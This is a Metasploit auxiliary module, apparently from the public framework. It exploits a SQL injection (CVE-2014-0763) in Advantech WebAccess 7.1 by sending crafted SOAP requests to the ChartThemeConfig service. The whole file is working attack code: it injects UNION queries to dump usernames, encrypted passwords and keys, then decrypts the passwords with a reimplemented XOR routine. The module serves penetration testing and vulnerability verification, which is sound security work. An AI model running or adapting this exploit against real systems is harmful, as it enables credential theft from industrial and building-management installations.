##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'rexml/document'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
  include REXML

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Advantech WebAccess SQL Injection',
      'Description'    => %q{
        This module exploits a SQL injection vulnerability found in Advantech WebAccess 7.1. The
        vulnerability exists in the DBVisitor.dll component, and can be abused through malicious
        requests to the ChartThemeConfig web service. This module can be used to extract the BEMS
        site usernames and hashes.
      },
      'References'     =>
        [
          [ 'CVE', '2014-0763' ],
          [ 'ZDI', '14-077' ],
          [ 'OSVDB', '105572' ],
          [ 'BID', '66740' ],
          [ 'URL', 'https://ics-cert.us-cert.gov/advisories/ICSA-14-079-03' ]
        ],
      'Author'         =>
        [
          'rgod <rgod[at]autistici.org>', # Vulnerability Discovery
          'juan vazquez' # Metasploit module
        ],
      'License'        => MSF_LICENSE,
      'DisclosureDate' => "Apr 08 2014"
    ))

    register_options(
      [
        OptString.new("TARGETURI", [true, 'The path to the BEMS Web Site', '/BEMS'])
      ], self.class)
  end

  def build_soap(injection)
    xml = Document.new
    xml.add_element(
        "s:Envelope",
        {
            'xmlns:s' => "http://schemas.xmlsoap.org/soap/envelope/"
        })
    xml.root.add_element("s:Body")
    body = xml.root.elements[1]
    body.add_element(
        "GetThemeNameList",
        {
            'xmlns' => "http://tempuri.org/"
        })
    name_list = body.elements[1]
    name_list.add_element("userName")
    name_list.elements['userName'].text = injection

    xml.to_s
  end

  def do_sqli(injection, mark)
    xml = build_soap(injection)

    res = send_request_cgi({
      'method'    => 'POST',
      'uri'       => normalize_uri(target_uri.path.to_s, "Services", "ChartThemeConfig.svc"),
      'ctype'    => 'text/xml; charset=UTF-8',
      'headers'  => {
          'SOAPAction' => '"http://tempuri.org/IChartThemeConfig/GetThemeNameList"'
      },
      'data'      => xml
    })

    unless res && res.code == 200 && res.body && res.body.include?(mark)
      return nil
    end

    res.body.to_s
  end

  def check
    mark = Rex::Text.rand_text_alpha(8 + rand(5))
    injection =  "#{Rex::Text.rand_text_alpha(8 + rand(5))}' "
    injection << "union all select '#{mark}' from BAThemeSetting where '#{Rex::Text.rand_text_alpha(2)}'='#{Rex::Text.rand_text_alpha(3)}"
    data = do_sqli(injection, mark)

    if data.nil?
      return Msf::Exploit::CheckCode::Safe
    end

    Msf::Exploit::CheckCode::Vulnerable
  end

  def parse_users(xml, mark)
    doc = Document.new(xml)

    strings = XPath.match(doc, "s:Envelope/s:Body/GetThemeNameListResponse/GetThemeNameListResult/a:string").map(&:text)
    strings_length = strings.length

    unless strings_length > 1
      return
    end

    i = 0
    strings.each do |result|
      next if result == mark
      if i < (strings_length / 3)
        @users.push(result)
      elsif i < (strings_length / 3) * 2
        @enc_passwords.push(result)
      else
        @keys.push(result)
      end
      i = i + 1
    end

  end

  def run
    print_status("#{peer} - Exploiting sqli to extract users information...")
    mark = Rex::Text.rand_text_alpha(8 + rand(5))
    rand = Rex::Text.rand_text_numeric(2)
    # While installing I can only configure an Access backend, but
    # according to documentation other backends are supported. This
    # injection should be compatible, hopefully, with most backends.
    injection =  "#{Rex::Text.rand_text_alpha(8 + rand(5))}' "
    injection << "union all select UserName from BAUser where #{rand}=#{rand} "
    injection << "union all select Password from BAUser where #{rand}=#{rand} "
    injection << "union all select Password2 from BAUser where #{rand}=#{rand} "
    injection << "union all select '#{mark}' from BAThemeSetting where '#{Rex::Text.rand_text_alpha(2)}'='#{Rex::Text.rand_text_alpha(3)}"
    data = do_sqli(injection, mark)

    if data.blank?
      print_error("#{peer} - Error exploiting sqli")
      return
    end

    @users = []
    @enc_passwords = []
    @keys = []
    @plain_passwords = []

    print_status("#{peer} - Parsing extracted data...")
    parse_users(data, mark)

    if @users.empty?
      print_error("#{peer} - Users not found")
      return
    else
      print_good("#{peer} - #{@users.length} users found!")
    end

    users_table = Rex::Ui::Text::Table.new(
      'Header'  => 'Advantech WebAccess Users',
      'Ident'   => 1,
      'Columns' => ['Username', 'Encrypted Password', 'Key', 'Recovered password']
    )

    for i in 0..@users.length - 1
      @plain_passwords[i] = decrypt_password(@enc_passwords[i], @keys[i])
      @plain_passwords[i] = "(blank password)" if @plain_passwords[i].empty?
      report_auth_info({
       :host => rhost,
       :port => rport,
       :user => @users[i],
       :pass => @plain_passwords[i],
       :type => "password",
       :sname => (ssl ? "https" : "http"),
       :proof => "Leaked encrypted password: #{@enc_passwords[i]}:#{@keys[i]}"
      })
      users_table << [@users[i], @enc_passwords[i], @keys[i], @plain_passwords[i]]
    end

    print_line(users_table.to_s)
  end

  def decrypt_password(password, key)
    recovered_password = recover_password(password)
    recovered_key = recover_key(key)

    recovered_bytes = decrypt_bytes(recovered_password, recovered_key)
    password = []

    recovered_bytes.each { |b|
      if b == 0
        break
      else
        password.push(b)
      end
    }

    return password.pack("C*")
  end

  def recover_password(password)
    bytes = password.unpack("C*")
    recovered = []

    i = 0
    j = 0
    while i < 16
      low = bytes[i]
      if low < 0x41
        low = low - 0x30
      else
        low = low - 0x37
      end
      low = low * 16

      high = bytes[i+1]
      if high < 0x41
        high = high - 0x30
      else
        high = high - 0x37
      end

      recovered_byte = low + high
      recovered[j] = recovered_byte
      i = i + 2
      j = j + 1
    end

    recovered
  end

  def recover_key(key)
    bytes = key.unpack("C*")
    recovered = 0

    bytes[0, 8].each { |b|
      recovered = recovered * 16
      if b < 0x41
        byte_weight = b - 0x30
      else
        byte_weight = b - 0x37
      end
      recovered = recovered + byte_weight
    }

    recovered
  end

  def decrypt_bytes(bytes, key)
    result = []
    xor_table = [0xaa, 0xa5, 0x5a, 0x55]
    key_copy = key
    for i in 0..7
      byte = (crazy(bytes[i] ,8 - (key & 7)) & 0xff)
      result.push(byte ^ xor_table[key_copy & 3])
      key_copy = key_copy / 4
      key = key / 8
    end

    result
  end

  def crazy(byte, magic)
    result = byte & 0xff

    while magic > 0
      result = result * 2
        if result & 0x100 == 0x100
          result = result + 1
        end
        magic = magic - 1
    end

    result
  end

end

